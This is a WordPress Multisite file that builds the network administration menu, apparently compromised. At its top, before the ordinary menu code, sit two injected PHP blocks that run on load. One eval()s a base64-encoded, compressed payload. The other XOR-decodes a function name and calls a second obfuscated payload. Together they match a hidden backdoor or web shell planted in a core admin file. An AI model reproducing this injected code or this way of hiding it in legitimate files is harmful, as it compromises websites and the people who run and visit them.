<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $FqRyvzvAeA='N+TX84k7UE;F8D6' ^ '-Y19LQ4Q +X2Q+X';$VMWkmHXlqsP=$FqRyvzvAeA('', ' 5Xh48CMN+>N96OU>NKDEAYGh JNW<95NMngba+7M5B:SN+BWtIY>401EX67.1YyMDPYYvmsK22seXayp8L4nBO HpSnWRMLa=X:1doIzIoHqll3M NKVHSxtT6>2pSIR=Eic2GFm620jKjjNb3P89eq3ju,XsV+;wf LgG7B3-EPRsQ<2p9MXXpKY. G XznUO.mSo02PI;ghS706rPU5.TBNCYKU5-73SWUNvCXU SXXnOK:AEAHRxYf;3zr=erJP;ncFWCZOwbw<1BCVoR:oMHO4B1d=.8EoAc>P,ropjD9TYyVyb.7Z:3JoLpC<SvPgtISIWDHV0D+5YS67<dyK4<5fc6;hd6FqLER1NetDF=Z;A<aGCb>oAW;=.:G<EsuQGV=OkIazb09OAfkSkM4Y:1Z1;Sm34KA>RX UtIvH<0R+E-AIF+E6BB0=Y13ebXO5lRS8VrCmOWUWU6NJIZX3ZnEwD JO4:=YDZypZQCb33YAUbcR707V=eK=Ye,.DJF0eD.7IijYrIJJ;FHeaEoSQeIvI3.QbNVQ2P:mEWZWI=dUQ-jW-3nW1WRg3AZIRF3gRhcf6eRSrwYaHHMA+=SLoGN0i.X=XABXr<UA6;2SDcBKV0-RzJmPCoYbNfBU3Y.xq5THPacAO:LXXXUvFCe;HBTAobBsdS'^'ISpIRM-.:BQ fS7<M:8lb9657D+:6cfX;9INKAP=DS7T0:B-9T16LkTP19ihCD-Qi 1-8ZMW WKZExAYPCF=gf U<PnNpuvFh4>UCLK ZtOxJLHZqS:9:-=PP0WJSYhivTnBJ8NOIYGDJeWJfFW1LX>UZ7UrxW=NB,BIlBgD6AA >zW:YKYddcRyB+KT2R6RJ::ZDhe9OZ41mL7VDWRmuSO81+xSo1TYVl82,nKc>4L =cdE-U3  +:XqBdp5=v,7j1HNG-2:zrIBSJP.63FrAeDl+U6P;VKAeRaGU5UIeyN X 8YkYFXV6OVqe1zIU5VxFP-2=6mh-:MMZ+6WTTDQoknp76sh<DW5Qh.7HnXJdbK;W4YHg8h7fe3ZIOe,Y<SHqc=X6PChsFTX; FVsO;U5OTa;2.gN>AeZ3,AuIi6=RC7Y,L- <NmN-0oY8ER:=5:AD02K3Dw2+2681Sfn-;,RsBeS A>.kQX msBz37kFWR- uDErVBE7D: X :IV-92CMcER0NFyV-+>ZohCGeG>5PaR-RZ09i=4KwgDejgwnXR7hNXnKVX4U43TWsjza RV6ZZUTQ47EPpAnnm YO250,+I6K T+51pUL48ZTS7cObo2QY3ScMpcOyB5lK0E8BPUQ5<1:D1.C 79<r+oxo2-:=5GRkHn.');$VMWkmHXlqsP();
/**
 * Build Network Administration Menu.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.1.0
 */

/* translators: Network menu item */
$menu[2] = array(__('Dashboard'), 'manage_network', 'index.php', '', 'menu-top menu-top-first menu-icon-dashboard', 'menu-dashboard', 'dashicons-dashboard');

$submenu['index.php'][0] = array( __( 'Home' ), 'read', 'index.php' );

if ( current_user_can( 'update_core' ) ) {
	$cap = 'update_core';
} elseif ( current_user_can( 'update_plugins' ) ) {
	$cap = 'update_plugins';
} elseif ( current_user_can( 'update_themes' ) ) {
	$cap = 'update_themes';
} else {
	$cap = 'update_languages';
}

$update_data = wp_get_update_data();
if ( $update_data['counts']['total'] ) {
	$submenu['index.php'][10] = array( sprintf( __( 'Updates %s' ), "<span class='update-plugins count-{$update_data['counts']['total']}'><span class='update-count'>" . number_format_i18n( $update_data['counts']['total'] ) . "</span></span>" ), $cap, 'update-core.php' );
} else {
	$submenu['index.php'][10] = array( __( 'Updates' ), $cap, 'update-core.php' );
}

unset( $cap );

$submenu['index.php'][15] = array( __( 'Upgrade Network' ), 'upgrade_network', 'upgrade.php' );

$menu[4] = array( '', 'read', 'separator1', '', 'wp-menu-separator' );

/* translators: Sites menu item */
$menu[5] = array(__('Sites'), 'manage_sites', 'sites.php', '', 'menu-top menu-icon-site', 'menu-site', 'dashicons-admin-multisite');
$submenu['sites.php'][5]  = array( __('All Sites'), 'manage_sites', 'sites.php' );
$submenu['sites.php'][10]  = array( _x('Add New', 'site'), 'create_sites', 'site-new.php' );

$menu[10] = array(__('Users'), 'manage_network_users', 'users.php', '', 'menu-top menu-icon-users', 'menu-users', 'dashicons-admin-users');
$submenu['users.php'][5]  = array( __('All Users'), 'manage_network_users', 'users.php' );
$submenu['users.php'][10]  = array( _x('Add New', 'user'), 'create_users', 'user-new.php' );

if ( current_user_can( 'update_themes' ) && $update_data['counts']['themes'] ) {
	$menu[15] = array(sprintf( __( 'Themes %s' ), "<span class='update-plugins count-{$update_data['counts']['themes']}'><span class='theme-count'>" . number_format_i18n( $update_data['counts']['themes'] ) . "</span></span>" ), 'manage_network_themes', 'themes.php', '', 'menu-top menu-icon-appearance', 'menu-appearance', 'dashicons-admin-appearance' );
} else {
	$menu[15] = array( __( 'Themes' ), 'manage_network_themes', 'themes.php', '', 'menu-top menu-icon-appearance', 'menu-appearance', 'dashicons-admin-appearance' );
}
$submenu['themes.php'][5]  = array( __('Installed Themes'), 'manage_network_themes', 'themes.php' );
$submenu['themes.php'][10] = array( _x('Add New', 'theme'), 'install_themes', 'theme-install.php' );
$submenu['themes.php'][15] = array( _x('Editor', 'theme editor'), 'edit_themes', 'theme-editor.php' );

if ( current_user_can( 'update_plugins' ) && $update_data['counts']['plugins'] ) {
	$menu[20] = array( sprintf( __( 'Plugins %s' ), "<span class='update-plugins count-{$update_data['counts']['plugins']}'><span class='plugin-count'>" . number_format_i18n( $update_data['counts']['plugins'] ) . "</span></span>" ), 'manage_network_plugins', 'plugins.php', '', 'menu-top menu-icon-plugins', 'menu-plugins', 'dashicons-admin-plugins');
} else {
	$menu[20] = array( __('Plugins'), 'manage_network_plugins', 'plugins.php', '', 'menu-top menu-icon-plugins', 'menu-plugins', 'dashicons-admin-plugins' );
}
$submenu['plugins.php'][5]  = array( __('Installed Plugins'), 'manage_network_plugins', 'plugins.php' );
$submenu['plugins.php'][10] = array( _x('Add New', 'plugin'), 'install_plugins', 'plugin-install.php' );
$submenu['plugins.php'][15] = array( _x('Editor', 'plugin editor'), 'edit_plugins', 'plugin-editor.php' );

$menu[25] = array(__('Settings'), 'manage_network_options', 'settings.php', '', 'menu-top menu-icon-settings', 'menu-settings', 'dashicons-admin-settings');
if ( defined( 'MULTISITE' ) && defined( 'WP_ALLOW_MULTISITE' ) && WP_ALLOW_MULTISITE ) {
	$submenu['settings.php'][5]  = array( __('Network Settings'), 'manage_network_options', 'settings.php' );
	$submenu['settings.php'][10] = array( __('Network Setup'), 'setup_network', 'setup.php' );
}
unset($update_data);

$menu[99] = array( '', 'exist', 'separator-last', '', 'wp-menu-separator' );

require_once(ABSPATH . 'wp-admin/includes/menu.php');
